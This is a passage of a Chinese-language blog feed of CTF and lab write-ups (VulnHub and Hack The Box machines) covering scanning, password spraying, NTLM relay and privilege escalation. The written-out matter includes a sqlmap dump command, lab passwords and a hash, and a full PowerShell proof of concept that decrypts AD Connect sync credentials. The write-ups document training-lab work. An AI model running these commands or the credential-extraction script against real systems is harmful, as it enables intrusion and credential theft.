&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE22b3fac5c697ab4833d62cd183a19882%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sqlmap查账号密码，过程非常复杂，贴上最后的命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap -u &amp;#34;http://192.168.1.134/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=xxx&amp;#34; -D joomladb -T &amp;#39;#__users&amp;#39; -C name,email,id,params,password,username --dump
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE23bd1c50cc4d1fd1d621d2abe8aef309%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;admin  | &lt;a href=&#34;mailto:freddy@norealaddress.net&#34;&gt;freddy@norealaddress.net&lt;/a&gt; | 629 | {&amp;ldquo;admin_style&amp;rdquo;:&amp;quot;&amp;quot;,&amp;ldquo;admin_language&amp;rdquo;:&amp;quot;&amp;quot;,&amp;ldquo;language&amp;rdquo;:&amp;quot;&amp;quot;,&amp;ldquo;editor&amp;rdquo;:&amp;quot;&amp;quot;,&amp;ldquo;helpsite&amp;rdquo;:&amp;quot;&amp;quot;,&amp;ldquo;timezone&amp;rdquo;:&amp;quot;&amp;quot;} | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin&lt;/p&gt;
&lt;p&gt;查询cmd5网站：&lt;/p&gt;
&lt;p&gt;付费记录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd66874bd5bc5c4ef2a4254136e2df059%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;john默认字典就跑出来了，就这还想要我的钱？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE35902ccbbe3e3a0dea4a732d5ff1d18e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改模板：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5843a4d128f3583d5e934dbc1ba05f42%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这里不知道为啥，访问error.php访问不到，我直接改了index.php，然后访问主页就可以了，实战建议自己添加一个php文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE90aa0d2e451366346e5467dbcc84d028%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权：&lt;/h1&gt;
&lt;p&gt;有GCC，可以考虑内核提权：&lt;/p&gt;
&lt;p&gt;小插曲，内核提权有风险，机器打崩了&lt;/p&gt;
&lt;p&gt;这脏牛就没成功过，离谱：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe6ab3817b26b881ff584c4312bfe5ee2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;2021-4034是真的好用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdbe123b2aa2919afa1c94e8aecfb578c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe15544377e89ac3397ee734f7e9b8c06%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X024 Intelligence</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x024-intelligence/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x024-intelligence/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf4f9356afcea710b2f0901fc2a4add22image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfa7745219d387cc800a4386832e34a59image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE644bca0295f9adbcadfd2d37e73cf0fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;根据端口开放情况进行判断，值得关注的端口：80、389、445、5985&lt;/p&gt;
&lt;p&gt;先看445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfa6384699fc73d26bfc5c37730a2a038image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;389：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa1db95b74dea5f6707387458a8d69784image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就只剩下80了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe55cbf3d3369f5348c7378bae8482f7dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只有一个documents目录，whatweb识别一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbbe3541eb52e7d4d102a8bc7d586f862image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像也没有历史漏洞，再看看这个pdf文件，发现可以枚举：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7485d8a1d87462f40454ba059af38274image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不能挨个看吧，我挨个看了：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://10.10.10.248/documents/2020-06-04-upload.pdf&#34;&gt;http://10.10.10.248/documents/2020-06-04-upload.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;默认密码：&lt;/p&gt;
&lt;p&gt;NewIntelligenceCorpUser9876&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE03c57ed047ab86d62173da91b40be201image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到密码，想到的就是密码喷洒：&lt;/p&gt;
&lt;p&gt;但是使用自带的字典失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6725a70ab9c274d66493a7f6d799ae72image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是有个地方是存在账号的，那就是文件的撰写人:&lt;/p&gt;
&lt;p&gt;写个bash脚本，下载了2020年的所有文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE059979f0e61bd1b4e32d4910b8baecb2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里明白了，有相关工具如果提供了详细参数的，建议就使用详细参数看看吧：&lt;/p&gt;
&lt;p&gt;应该是工具或者环境的问题，这里没法爆破成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94978b586d88e74a2b82e75734479c35image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;带上详细参数看看：&lt;/p&gt;
&lt;p&gt;并非是密码错误，也是就说这个账号密码应该是正确的，只是请求kdc出错了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58ec1d32c8aca8572c6d76ff5de63726image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到了账号密码，但是看了一下&lt;/p&gt;
&lt;p&gt;ldap和winrm都不能登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1a1d57adb84c7ea3de1f7411e9b48fa1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbb836cee37273e3f81a3a46b0c5b5bbeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;大概看了一下这个脚本，他说每5分钟执行一次，请求一些东西，但是怎么利用呢，猜测是relay，再接着看：&lt;/p&gt;
&lt;p&gt;发现flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c55f4785d655114866dd7675f33200bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面看了一下wp，确实知识面欠缺，需要添加一个dns解析，而且域内是默认可以添加的，有合法身份即可：&lt;/p&gt;
&lt;p&gt;添加dns记录后，relay:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf7c343b450a1772e87fc1e735ee208b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1a504314810bc96ac98c94b0275adaafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不让登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEccd1611c31186d956fef5100cf44069cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不过不要紧，正常渗透就行了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6eb416c86bb9f58e7aab3e73c7fc2d33image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x025 DC 7</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x025-dc-7/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x025-dc-7/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf727e4cac6c3d940ff1aac06aee664de%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1527c0ea7168f2d51b2b4158dbdef95%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;drupal准确版本：8.7.6&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec78e70ad5fb9066201f86fcb6670d09%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;作者提示要跳出思维，暂时不要考虑爆破：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdd2f715a6719ccd40c398f1c8e8f3d29%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好好好，我打死也没想到要这样子跳出思维：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEab409d8569bbf0be265dec29e302b3cc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去github上搜索这个用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE33bc1bb7046a8a01c3a3f49fd9a83492%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;找到数据库配置文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE86d8cd1aaa55eb57dce4b0a56835951b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;由于没开mysql只能先试试ssh:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE03be98d809d2fee2455fe3e35f824801%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;这靶机完全翻车了，提权也很离谱，首先是家目录下面有一个非正常文件，叫mbox，看一下发现计划任务字样：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6f02ef6140f51f973af2b9c13baa45f9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看文件，大致内容为清空文件夹、备份数据库，打包，修改权限，然后删除，看样子，理论上，我是有机会在计划任务执行期间复制website.sql的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEca2b9c1242fcf271a8ced0c5ac391cb0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;理论上行得通，这又何尝不是一种条件竞争呢，写一个shell脚本试试：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash
for i in {1..10000}
do
cp website.sql ../
sleep 1
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE43db16261b1ad56453179eb10c637a2d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd7978a4fa5cdc3e0f9f8b595f6ce2070%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;内容太多了，不好看，罢了，我有数据库密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE37df18db587e342de64ce78e622add64%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;算了，搞了半天，数据库连不上，其实想看数据库主要也是想看web后台密码。&lt;/p&gt;
&lt;p&gt;直接修改sh，是没修改权限的，但是www-data有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8ea968f9eea505d4490c874a11b9e524%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后想去拿个webshell，直接修改php文件，然后我一看web目录又没权限，再次翻车：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf590a498ceac7ef7236b8a3eabc3e812%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;无奈看wp，修改drupal的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE31551ab625f010a14b5ea0523d34e834%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后登录后台去修改php代码，添加php模块，url:&lt;a href=&#34;https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz&#34;&gt;https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9ab714f997ac369e289c6522fcb98f19%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;开启：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE89cd5def2f6b4dab07b0e8f878cc692e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改代码，保存后自动执行&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed66d330641168e2fb32801784958155%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X025 monteverde</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x025-monteverde/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x025-monteverde/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4426b40786740c7305d93ea06e382c93image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0370475fd82030fafde08a613842492dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE232cda4a25eed1d4e8da0fa0dc53bfb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：445、389、5985&lt;/p&gt;
&lt;p&gt;445没有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7afb4bd7f5c08207390677f10b9e8063image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;389可以列出用户名：&lt;/p&gt;
&lt;p&gt;但是AS-REP Roasting失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf114d779bca9d8081ca239ac0ad179c9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就只能破解试试了：&lt;/p&gt;
&lt;p&gt;发现没有锁定策略：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE49b27ff43cafb6269200e46970c1cdfeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过尝试：&lt;/p&gt;
&lt;p&gt;账户名即使密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE105e0d41c91897f7ce7d0554fd87e44aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe709208fcb6e72c01b8a4d7635afbb5eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc8de8f23b84b70e406352ad856bbb41image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码喷洒：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7f024ac9675ca06bcd8eba13e1a56e8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9ee4435ce06c2160a6922134155a562eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound&lt;/p&gt;
&lt;p&gt;简单解读一下，就是本地提权，或者寻找其他路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe4cf0162cd4e7cf6da9b86703cce2961image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpeass:&lt;/p&gt;
&lt;p&gt;感觉这个有机会，应为和这个组的权限好像有关系：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE65d209b7e589d06fcd76176d689c1a16image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看一下软件安装情况，可以发现这些软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe30dd0a310c0f7457d77fbae05e3a93dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面的内容属实不会了，无奈看了wp:&lt;/p&gt;
&lt;p&gt;最后修改的poc:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Function Get-ADConnectPassword{
Write-Host &amp;#34;AD Connect Sync Credential Extract POC (@_xpn_)`n&amp;#34;
$key_id = 1
$instance_id = [GUID]&amp;#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31&amp;#34;
$entropy = [GUID]&amp;#34;194EC2FC-F186-46CF-B44D-071EB61F49CD&amp;#34;
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &amp;#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true&amp;#34;
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = &amp;#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &amp;#39;AD&amp;#39;&amp;#34;
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path &amp;#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&amp;#39;
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath &amp;#34;//parameter[@name=&amp;#39;forest-login-domain&amp;#39;]&amp;#34; | select @{Name = &amp;#39;Domain&amp;#39;; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath &amp;#34;//parameter[@name=&amp;#39;forest-login-user&amp;#39;]&amp;#34; | select @{Name = &amp;#39;Username&amp;#39;; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath &amp;#34;//attribute&amp;#34; | select @{Name =&amp;#39;Password&amp;#39;; Expression = {$_.node.InnerXML}}
Write-Host (&amp;#34;Domain: &amp;#34; + $domain.Domain)
Write-Host (&amp;#34;Username: &amp;#34; + $username.Username)
Write-Host (&amp;#34;Password: &amp;#34; + $password.Password)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb5d2e0593c0820d808addcfcde8e712cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x026 eLection 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x026-election-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x026-election-1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3a7a3707ff0480a0948261e2a5ae96a7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEacc157c8b770af83a7fdfa7b79a19f58%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;东西不多，就那么几个，重点看起来要么在phpmyadmin要么在那个election中：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf71c52abf5b7ef6f0b312fddd9d604e7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查了一圈，好像没看到什么明显的漏洞，邪门儿，冷静后再扫一次，打靶就是这样，很多时候是被自己困住的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9b3ec4f6acd4c92c952745dbdd66fa86%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;得到账号密码：love: P@$$w0rd@123&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2a1d6c9732cb45df21541d41003b1e6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa7e69367b98b8a5723777b4fb0b5dea0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有GCC，考虑一下内核提权：&lt;/p&gt;
&lt;p&gt;没什么好说的，秒了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb893305b7ff9173f72f19dff2a2c52b7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
